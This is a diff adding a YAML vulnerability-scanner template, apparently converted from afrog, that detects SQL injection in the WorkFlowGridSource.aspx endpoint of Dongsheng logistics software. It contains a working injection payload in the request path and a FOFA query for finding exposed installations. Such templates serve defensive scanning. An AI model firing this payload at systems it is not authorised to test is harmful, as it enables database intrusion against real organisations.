@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - Microsoft SQL Server
+          - 'SqlException:'
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/WorkFlow/WorkFlowGridSource.aspx?handle=steplist&flowid=''-1/@@version--'
+id: dongshengwuliu-workflowgridsource-sqli
+info:
+  author: avic123
+  description: |
+    东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。 东胜物流软件WorkFlowGridSource.aspx接口存在SQL注⼊漏洞
+    fofa: body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 东胜物流软件WorkFlowGridSource.aspx接口存在SQL注入漏洞
+  severity: high
+  tags: dongshengwuliu,sqli,argus-import
